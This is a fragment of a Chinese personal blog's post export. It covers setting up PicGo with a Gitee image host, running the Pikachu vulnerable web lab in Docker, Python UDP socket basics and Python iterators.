    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="创建gitee库"><a href="#创建gitee库" class="headerlink" title="创建gitee库"></a>创建gitee库</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-09-08_10-47.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-09-08_10-48.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-09-08_10-50.png"></p>
<p><strong>启动服务</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-09-08_10-52.png"></p>
<h3 id="设置私人令牌下面配置PicGo会用到"><a href="#设置私人令牌下面配置PicGo会用到" class="headerlink" title="设置私人令牌下面配置PicGo会用到"></a>设置私人令牌下面配置PicGo会用到</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-09-08_10-56.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-09-08_10-57_1.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-09-08_10-59.png"><br>叫这个令牌复制下来</p>
<h2 id="PicGo下载"><a href="#PicGo下载" class="headerlink" title="PicGo下载"></a>PicGo下载</h2><h3 id="1-PicGo的下载"><a href="#1-PicGo的下载" class="headerlink" title="1.PicGo的下载"></a>1.PicGo的下载</h3><p><strong>跨平台windows，linux，mac都支持</strong><br>我用的是kali linux是下面是安装的就是linux系统了<br>下载地址<a href="https://github.com/Molunerfinn/PicGo/releases">PicGo下载</a></p>
<p><strong>linux下载的是这个</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200908111030.png"></p>
<p>我用的是linux的root用户所以运行要添加<code>--no-sandbox</code><br>启动命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;PicGo-2.3.0-beta.3.AppImage  --no-sandbox</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200908111347.png"><br>打开详细内容</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-09-08_10-45_1.png"></p>
<h3 id="2-PicGo添加gitee插件"><a href="#2-PicGo添加gitee插件" class="headerlink" title="2.PicGo添加gitee插件"></a>2.PicGo添加gitee插件</h3><p>在插件那搜索gitee<br>等一会就下载好了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-09-08_10-46.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-09-08_10-51.png"></p>
<h3 id="3-gitee配置"><a href="#3-gitee配置" class="headerlink" title="3.gitee配置"></a>3.gitee配置</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-09-08_11-00.png"></p>
<ol>
<li>第一个<strong>repo</strong>是你创建的库的目录<br> <img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200908113922.png"></li>
<li>第二个<strong>branch</strong>是分支<br> 是<code>master</code></li>
<li>第三个<strong>token</strong>是上面gitee的密钥<br> <img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/2020-09-08_10-59.png"></li>
<li>第四个<strong>path</strong>路径<br> 一般写上<code>img</code></li>
<li>第五个<strong>customPath</strong>可以不用填</li>
</ol>
<p>上面的添加完后就可以，确定，设置默认的就可以上发了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200908114535.png"><br>就可以上发了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200908114636.png"></p>
]]></content>
      <categories>
        <category>搭建</category>
        <category>其他</category>
      </categories>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker安装pikachu靶场搭建</title>
    <url>/2021/04/20/pikachu/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note info simple"><p>项目地址<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
</div>

<p>Pikachu上的漏洞类型列表如下： </p>
<ul>
<li>Burt Force(暴力破解漏洞)</li>
<li>XSS(跨站脚本漏洞)</li>
<li>CSRF(跨站请求伪造)</li>
<li>SQL-Inject(SQL注入漏洞)</li>
<li>RCE(远程命令/代码执行)</li>
<li>Files Inclusion(文件包含漏洞)</li>
<li>Unsafe file downloads(不安全的文件下载)</li>
<li>Unsafe file uploads(不安全的文件上传)</li>
<li>Over Permisson(越权漏洞)</li>
<li>../../../(目录遍历)</li>
<li>I can see your ABC(敏感信息泄露)</li>
<li>PHP反序列化漏洞</li>
<li>XXE(XML External Entity attack)</li>
<li>不安全的URL重定向</li>
<li>SSRF(Server-Side Request Forgery)</li>
<li>管理工具</li>
<li>More…(找找看?..有彩蛋!)</li>
</ul>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zhuifengshaonianhanlu/pikachu.git</span><br></pre></td></tr></table></figure>
<h1 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h1><div class="note info simple"><p>进入下载好的目录<code>cd pikachu</code></p>
</div>

<p>制作项目里面的指定的镜像</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo docker build -t <span class="string">&quot;pikachu&quot;</span> .</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210420093905623.png" alt="image-20210420093905623"></p>
<p>查看生成镜像没有已经好了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210420094234918.png" alt="image-20210420094234918"></p>
<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -d -p8080:80 pikachu</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210420094335857.png" alt="image-20210420094335857"></p>
<p>查看有没有启动</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
<p>可以看见已经启动了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210420094453449.png" alt="image-20210420094453449"></p>
<p>我们访问<code>127.0.0.1:8080</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210420094615838.png" alt="image-20210420094615838"></p>
]]></content>
      <categories>
        <category>搭建</category>
        <category>Docker容器搭建</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>python3网络编程socket</title>
    <url>/2020/06/26/python3%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8Bsocket/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="实验环境搭建"><a href="#实验环境搭建" class="headerlink" title="实验环境搭建"></a>实验环境搭建</h2><p>接收端和发送</p>
<p>我在虚拟机win7启动一个网络调试工具<br>这个我已经启动了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/202006220922502.png" alt="在这里插入图片描述"></p>
<h2 id="创建套接字"><a href="#创建套接字" class="headerlink" title="创建套接字"></a>创建套接字</h2><p>代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#导入库</span><br><span class="line"></span><br><span class="line">import socket    </span><br><span class="line"></span><br><span class="line">#创建套接字</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#关闭套接字</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p>代码说明</p>
<ol>
<li>导入socket</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import socket</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>Python 中，我们用 socket() 函数来创建套接字，语法格式如下</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s&#x3D;socket.socket(socket. AF_INET,SOCK_STREAM或者SOCK_DGRAM)</span><br></pre></td></tr></table></figure>
<p>解释<br>第一个:  socket. AF_INET是IPv4的意思<br>第二个: SOCK_STREAM和SOCK_DGRAM，如果填写SOCK_STREAM是tcp的意思，SOCK_DGRAM是udp的意思<br>3. 关闭socket</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s.close()</span><br></pre></td></tr></table></figure>


<p>​    </p>
<h2 id="向目标发送信息"><a href="#向目标发送信息" class="headerlink" title="向目标发送信息"></a>向目标发送信息</h2><ol>
<li>发送端<br>代码</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#导入库</span><br><span class="line">import socket    </span><br><span class="line"></span><br><span class="line">#创ipv4,和UDP类型的建套接字</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_DGRAM)   </span><br><span class="line"></span><br><span class="line">#发送信息</span><br><span class="line">s.sendto(b&quot;1111&quot;,(&quot;192.168.31.207&quot;,8080))</span><br><span class="line"></span><br><span class="line">#关闭套接字</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p>代码讲解<br>创建套接字上面已经说了<br><strong>1.代码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s.sendto(b&quot;abcd&quot;,(&quot;192.168.31.207&quot;,8080))</span><br></pre></td></tr></table></figure>
<p>里面的参数<br>第一个：是发送到内容，应为他发送不支持字符串只支持bytes类型的所以就b就不是字符串了<br>看一下有b和没有b的类型<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200622100013723.png" alt="在这里插入图片描述"></p>
<p>第二个：是目标(host)和端口(port)，这个括号()是python的元组</p>
<p>看一下结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020062209340771.png" alt="在这里插入图片描述"></p>
<ol start="2">
<li>发送代码升级替换b<br>代码<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#导入库</span><br><span class="line">import socket    </span><br><span class="line"></span><br><span class="line">#创ipv4,和UDP类型的建套接字</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_DGRAM)    </span><br><span class="line"></span><br><span class="line">#发送信息</span><br><span class="line">s.sendto(&quot;abcd&quot;.encode(&quot;utf-8&quot;),(&quot;192.168.31.207&quot;,8080))</span><br><span class="line"></span><br><span class="line">#关闭套接字</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
代码讲解<br>添加一个encode(“utf-8”)就可以解决用b来代替了<br>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200622110852897.png" alt="在这里插入图片描述"></li>
<li>指定源端口<br>代码<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#导入库</span><br><span class="line">import socket    </span><br><span class="line"></span><br><span class="line">#创ipv4,和UDP类型的建套接字</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_DGRAM)     </span><br><span class="line"></span><br><span class="line"># 绑定源端口</span><br><span class="line">s.bind((&quot;192.168.31.112&quot;,8080))</span><br><span class="line"></span><br><span class="line">#发送信息</span><br><span class="line">s.sendto(&quot;dsadsa&quot;.encode(&quot;utf-8&quot;),(&quot;192.168.31.207&quot;,8080))</span><br><span class="line"></span><br><span class="line">#关闭套接字</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
代码介绍<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s.bind((&quot;192.168.31.112&quot;,8080))</span><br></pre></td></tr></table></figure>
绑定本地地址<br>里面是一个元组里面<br>第一个：是本地的IP<br>第二个：是监听的本地的端口</li>
</ol>
<h2 id="接收"><a href="#接收" class="headerlink" title="接收"></a>接收</h2><ol>
<li>接收</li>
</ol>
<p>代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#导入库</span><br><span class="line">import socket    </span><br><span class="line"></span><br><span class="line">#创ipv4,和UDP类型的建套接字</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_DGRAM)   </span><br><span class="line"></span><br><span class="line"># 绑定IP和端口</span><br><span class="line">s.bind((&quot;192.168.31.112&quot;,8080))</span><br><span class="line"></span><br><span class="line"># 接收数据</span><br><span class="line">a&#x3D;s.recvfrom(1024)</span><br><span class="line"></span><br><span class="line"># 输出数据</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">#关闭套接字</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p>代码介绍<br><strong>1.代码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s.bind((&quot;192.168.31.112&quot;,8080))</span><br></pre></td></tr></table></figure>
<p>绑定本地地址<br>里面是一个元组里面<br>第一个：是本地的IP<br>第二个：是监听的本地的端口</p>
<p><strong>2.代码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;s.recvfrom(1024)</span><br></pre></td></tr></table></figure>
<p>recvfrom()函数是用来接收UDP数据的，<br>大部分我们都是接收数据都是给他1024</p>
<p><strong>结果</strong><br>用网络调试工具发数据<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200622155258314.png" alt="在这里插入图片描述"><br>看一下这个已经接收到了数据<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200622155338807.png" alt="在这里插入图片描述"><br>2. 接收代码升级<br>代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#导入库</span><br><span class="line">import socket    </span><br><span class="line"></span><br><span class="line">#创ipv4,和UDP类型的建套接字</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_DGRAM)    </span><br><span class="line"></span><br><span class="line"># 绑定IP和端口</span><br><span class="line">s.bind((&quot;192.168.31.112&quot;,8080))</span><br><span class="line"></span><br><span class="line"># 接收数据</span><br><span class="line">a&#x3D;s.recvfrom(1024)</span><br><span class="line"></span><br><span class="line"># 元组分割</span><br><span class="line">b&#x3D;a[1][0]</span><br><span class="line">c&#x3D;a[1][1]</span><br><span class="line">d&#x3D;a[0]</span><br><span class="line"># 输出结果</span><br><span class="line">print(&quot;目标&quot;,b)</span><br><span class="line">print(&quot;端口&quot;,c)</span><br><span class="line">print(&quot;发送的数据是&quot;,d.decode(&#39;utf-8&#39;))</span><br><span class="line"></span><br><span class="line">#关闭套接字</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p>代码介绍<br><strong>1.代码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#x3D;a[1][0]</span><br><span class="line">c&#x3D;a[1][1]</span><br><span class="line">d&#x3D;a[0]</span><br></pre></td></tr></table></figure>
<p>如果不进行分割看一下他的元组<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200622155338807.png" alt="在这里插入图片描述"><br>应为接收的数据是元组格式格式的里面有发的数据和ip端口<br>这个就进行分割了<br><strong>2.代码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;目标&quot;,b)</span><br><span class="line">print(&quot;端口&quot;,c)</span><br><span class="line">print(&quot;发送的数据是&quot;,d.decode(&#39;utf-8&#39;))	</span><br></pre></td></tr></table></figure>
<p>这个分割出来了输出结果<br>应为数据需要解码所以就用decode(‘utf-8’)进行解码</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>Python网络编程</tag>
      </tags>
  </entry>
  <entry>
    <title>python迭代器</title>
    <url>/2021/06/09/pythonddq/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>在学习爬虫的时候认识到到迭代我就顺便记录下面</strong></p>
<h1 id="什么是迭代"><a href="#什么是迭代" class="headerlink" title="什么是迭代"></a>什么是迭代</h1><div class="note info simple"><p>for遍历就是迭代</p>
<p>for循环能遍历的就是可迭代，不能遍历的就是不可迭代</p>
</div>



<div class="note info simple"><p>for循环是怎么判断他是可迭代的，一个可迭代对象都有一个 <code>__iter__()</code> 方法，就是里面有<code>__iter__()</code> 方法，就是可迭代</p>
</div>

<h2 id="迭代的基本演示"><a href="#迭代的基本演示" class="headerlink" title="迭代的基本演示"></a>迭代的基本演示</h2><div class="note warning simple"><p>比如下面这个代码就是可迭代</p>
</div>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure>
<div class="note warning simple"><p>下面是不可迭代</p>
</div>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">123</span>:</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&#x2F;home&#x2F;zss&#x2F;a.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    for i in 123:</span><br><span class="line">TypeError: &#39;int&#39; object is not iterable</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>判断是否是可迭代可以用<code>collections.abc</code>模块里面的<code>Iterable</code></p>
</div>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span>  collections.abc <span class="keyword">import</span>  Iterable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#isinstance函数来判断一个对象是否是一个已知的类型</span></span><br><span class="line">print(isinstance(a,Iterable))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">True</span><br></pre></td></tr></table></figure>
<h1 id="什么是可迭代对象-iter-方法"><a href="#什么是可迭代对象-iter-方法" class="headerlink" title="什么是可迭代对象__iter__() 方法"></a>什么是可迭代对象<code>__iter__()</code> 方法</h1><p>我们可以看一下能迭代的里面都是有什么方法</p>
<ul>
<li><p>查看列表里方法</p>
<p>  查看列表全部方法里面有<code>__iter__()</code> 方法</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(a)</span><br><span class="line">[<span class="string">&#x27;__add__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__contains__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__delitem__&#x27;</span>, <span class="string">&#x27;__delslice__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__getslice__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__iadd__&#x27;</span>, <span class="string">&#x27;__imul__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__len__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__mul__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__reversed__&#x27;</span>, <span class="string">&#x27;__rmul__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>, <span class="string">&#x27;__setslice__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;append&#x27;</span>, <span class="string">&#x27;count&#x27;</span>, <span class="string">&#x27;extend&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;remove&#x27;</span>, <span class="string">&#x27;reverse&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
<li><p>查看元组里方法</p>
<p>他里面也有<code>__iter__()</code> 方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(a)</span><br><span class="line">[<span class="string">&#x27;__add__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__contains__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__getnewargs__&#x27;</span>, <span class="string">&#x27;__getslice__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__len__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__mul__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__rmul__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;count&#x27;</span>, <span class="string">&#x27;index&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
<li><p>查看字典里方法</p>
<p>他里面也有<code>__iter__()</code> 方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;b&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(a)</span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__cmp__&#x27;</span>, <span class="string">&#x27;__contains__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__delitem__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__len__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;clear&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;fromkeys&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;has_key&#x27;</span>, <span class="string">&#x27;items&#x27;</span>, <span class="string">&#x27;iteritems&#x27;</span>, <span class="string">&#x27;iterkeys&#x27;</span>, <span class="string">&#x27;itervalues&#x27;</span>, <span class="string">&#x27;keys&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;popitem&#x27;</span>, <span class="string">&#x27;setdefault&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;values&#x27;</span>, <span class="string">&#x27;viewitems&#x27;</span>, <span class="string">&#x27;viewkeys&#x27;</span>, <span class="string">&#x27;viewvalues&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>使用这个方法</strong></p>
<p>代码，可以看见他是一个listiterator(列表迭代器)对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.__iter__()</span><br><span class="line">&lt;listiterator object at <span class="number">0x7f90176f7150</span>&gt;</span><br></pre></td></tr></table></figure>
<p>在<code>__iter__()</code> 方法里面有下面这么多的方法，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__dir__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__init_subclass__&#39;, &#39;__iter__&#39;, &#39;__le__&#39;, &#39;__length_hint__&#39;, &#39;__lt__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__next__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__setstate__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;]</span><br></pre></td></tr></table></figure>
<p>其中<code>__length_hint__()</code>，<code>__next__()</code>和<code>__setstate__()</code></p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>__length_hint__()</code></td>
<td>元素数量</td>
</tr>
<tr>
<td><code>__next__()</code></td>
<td>方法也允许您执行操作，并且必须返回序列中的下一个项目</td>
</tr>
<tr>
<td><code>__setstate__(开始位置)</code></td>
<td>位置信息来重建文件对象，就是指定开始循环的位置</td>
</tr>
</tbody></table>
<h2 id="length-hint-方法"><a href="#length-hint-方法" class="headerlink" title="__length_hint__()方法"></a><code>__length_hint__()</code>方法</h2><p>for循环是怎么知道数组他有几个，用的就是<code>__iter__()</code> 方法里面<code>__length_hint__()</code>方法</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.__iter__().__length_hint__()</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<h2 id="next-方法"><a href="#next-方法" class="headerlink" title="__next__()方法"></a><code>__next__()</code>方法</h2><p>方法也允许您执行操作，并且必须返回序列中的下一个项目</p>
<p>他会一个一个的去执行下一个</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>].__iter__()</span><br><span class="line"></span><br><span class="line">print(a.__next__())</span><br><span class="line">print(a.__next__())</span><br><span class="line">print(a.__next__())</span><br><span class="line">print(a.__next__())</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210701175905468.png" alt="image-20210701175905468"></p>
<h2 id="setstate-方法"><a href="#setstate-方法" class="headerlink" title="__setstate__()方法"></a><code>__setstate__()</code>方法</h2><p>位置信息来重建文件对象，就是指定开始循环的位置</p>
